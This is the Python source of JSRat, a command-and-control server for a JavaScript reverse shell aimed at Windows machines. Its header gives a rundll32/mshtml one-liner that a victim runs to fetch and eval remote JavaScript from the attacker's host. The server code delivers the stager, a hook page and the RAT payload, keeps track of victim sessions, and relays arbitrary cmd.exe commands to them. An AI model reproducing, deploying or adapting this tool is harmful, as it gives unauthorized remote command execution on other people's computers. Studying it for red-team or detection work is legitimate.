#!/usr/bin/env python2
#
# JSRat Server - Python Implementation
# Original script by Hood3dRob1n 
# 
# Made with <3 by @byt3bl33d3r
#
# Shout-out to @subtee for this awesomness!

"""
   Simple JS Reverse Shell over HTTP for Windows
   We run web server and then execute commands against the connecting Client/Victim
  
   Command to Launch JS Reverse Shell from Client||Victim Windows box:
   rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://10.10.10.10:31337/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}

   $(JSRat)> cmd /c dir C:\

   References & Original Project:
      http://en.wooyun.io/2016/02/04/42.html
      http://en.wooyun.io/2016/01/18/JavaScript-Backdoor.html
      https://gist.github.com/subTee/f1603fa5c15d5f8825c0

"""

import argparse
import os
import readline
import sys
import cmd
import socket
import re
import BaseHTTPServer
import random
import string
from threading import Thread
from BaseHTTPServer import BaseHTTPRequestHandler

def gen_stager(js_load_path):
    cmd = 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";'
    with open('javascript/jsrat_stager.js' , 'r') as jsrat_stager:
        jsrat_stager = re.sub('BIND_IP', args.bind_ip, jsrat_stager.read())
        jsrat_stager = re.sub('BIND_PORT', str(args.bind_port), jsrat_stager)
        jsrat_stager = re.sub('BIND_URL', js_load_path, jsrat_stager)
        return cmd + jsrat_stager

def gen_hook(js_load_path):
    with open('javascript/hook.html' , 'r') as hook:
        hook = re.sub('BIND_IP', args.bind_ip, hook.read())
        hook = re.sub('BIND_PORT', str(args.bind_port), hook)
        hook = re.sub('BIND_URL', js_load_path, hook)
        return hook

def gen_jsrat():
    sess_id = ''.join(random.sample(string.ascii_letters, 10))
    with open('javascript/jsrat.js', 'r') as js_rat:
        js_rat = re.sub('BIND_IP', args.bind_ip, js_rat.read())
        js_rat = re.sub('BIND_PORT', str(args.bind_port), js_rat)
        js_rat = re.sub('SESS_ID', sess_id, js_rat)
        return js_rat

class JSRatServer(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
      """ Custom Log Handler to Spit out on to stderr """
      return

    def do_GET(self):
        """
            Handle any GET requests coming into our server
        """
        response_message = ''
        content_type = 'text/plain'

        if self.server.js_load_path == self.path:
            response_message = gen_jsrat()

        elif "/rat?=" in self.path:
            # Get input from server operator on what to do next...
            sess_id = self.path.split('?=')[1]
            if sess_id not in self.server.sessions.keys():
                print '\n'
                print "New JSRat Client: {}".format(self.client_address[0])
                self.server.sessions[sess_id] = []

            if len(self.server.sessions[sess_id]) != 0:
                response_message = self.server.sessions[sess_id].pop()

        elif "/uploadpath?=" in self.path:
            pass

        elif "/uploaddata?=" in self.path:
            pass

        elif "/hook" == self.path:
            content_type = 'text/html'
            response_message = gen_hook(self.server.js_load_path)

        elif "/wtf" == self.path:
            print "Client Command Query from: {}".format(self.client_address[0])
            response_message = gen_stager(self.server.js_load_path)

        # Send the built response back to client
        self.send_response(200);
        self.send_header('Content-type', content_type)
        self.end_headers()
        self.wfile.write(response_message)

    def do_POST(self):
        """
            Handle any POST requests coming into our server
        """

        if "/rat?=" in self.path:
            content_len = int(self.headers.getheader('content-length', 0))
            post_body = self.rfile.read(content_len)
            if post_body and 'undefined' not in post_body:
                print '\n' + post_body.strip()

            self.send_response(200)
            self.send_header('Content-type','text/plain')
            self.end_headers()

        elif "/download?=" in self.path:
            pass

        else:
            print "{} - Snooper detected...".format(self.client_address[0])
            print "=> {}".format(self.path)
            self.send_error(404)

class JSRatAgent(cmd.Cmd):

    def __init__(self, main_menu, agent_id):
        cmd.Cmd.__init__(self)
        self.prompt = 'jsrat({}) > '.format(agent_id)
        self.main_menu = main_menu
        self.agent_id = agent_id
        self.server = main_menu.server

    def do_back(self, line):
        return True

    def default(self, line):
        command = 'cmd.exe /Q /c ' + line
        self.server.sessions[self.agent_id].append(command)

    def do_upload(self, line):
        pass
        """
        lpath = raw_input("Enter Full Path for Local File to Upload")
        JSRatServer.upload_path = lpath
        print "Setting local upload path to: {}".format(JSRatServer.upload_path)
        destination_path = raw_input("Enter Remote Path to Write Uploaded Content")
        response_message = destination_path.strip()

        response_message = open(JSRatServer.upload_path, 'rb+').read()
        JSRatServer.upload_path = ""
        """

    def do_download(self, line):
        pass
        """
        content_len = int(self.headers.getheader('content-length', 0))
        post_body = self.rfile.read(content_len)
        fname = raw_input("Enter Filename to Save in ./loot/")
        try:
            loot_file = outdir.strip()+fname.strip()
            fh = open(loot_file, 'wb+')
            fh.write(post_body)
            fh.close()
            print "Successfully Saved To: {}\n".format(loot_file.replace(home, "./"))

        except Exception as e:
            print "Problem saving content to {}: {}".format(loot_file.replace(home, "./"), e)
            self.send_response(200)
            self.send_header('Content-type','text/plain')
            self.end_headers()
        """

    def emptyline(self): pass

class JSRatCmd(cmd.Cmd):

    def __init__(self, args):
        cmd.Cmd.__init__(self)
        self.prompt = 'jsrat > '
        self.server = BaseHTTPServer.HTTPServer((args.bind_ip, args.bind_port), JSRatServer)
        self.server.js_load_path = '/connect' # Base URL path to initialize things (value is overridden at server start)
        self.server.upload_path = "" # static so we can set/get as needed, since this isnt powershell...
        self.server.time_to_stop = False
        self.server.sessions = {}

        t = Thread(name='http_server', target=self.server.serve_forever)
        t.setDaemon(True)
        t.start()
 
    def do_sessions(self, line):
        for session in self.server.sessions.keys():
            print session

    def do_interact(self, line):
        if line == '':
            print 'You must specify an agent'
        else:
            agentmenu = JSRatAgent(self, line)
            agentmenu.cmdloop()

    def do_exit(self, line):
        sys.exit(0)

    def emptyline(self): pass

    def complete_interact(self, text, line, begidx, endidx):

        names = self.server.sessions.keys()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

if __name__ == '__main__':

    # Parse Arguments/Options
    parser = argparse.ArgumentParser('JSRat-Py', version="0.1");
    parser.add_argument("-i", "--ip", dest="bind_ip", required=True, type=str, help="IP to bind server to")
    parser.add_argument("-p", "--port", dest="bind_port", default=8080, type=int, help="Port to bind server to (default: 8080)")
    
    args = parser.parse_args()

    """ 
      Establish our base web server and initiate the event loop to drive things

      1 - Overrides custom handler path for URL to initiate things
      2 - Binds socket to ip and port, and then maps to our custom handler
      3 - Starts endless event loop & pass off for myHandler to handle requests
    """

    try:
        jsratcmd = JSRatCmd(args)
        jsratcmd.cmdloop()
    except socket.error as e:
        print "Error starting HTTP server: {}".format(e)
        sys.exit(1)

    except KeyboardInterrupt:
        sys.exit(1)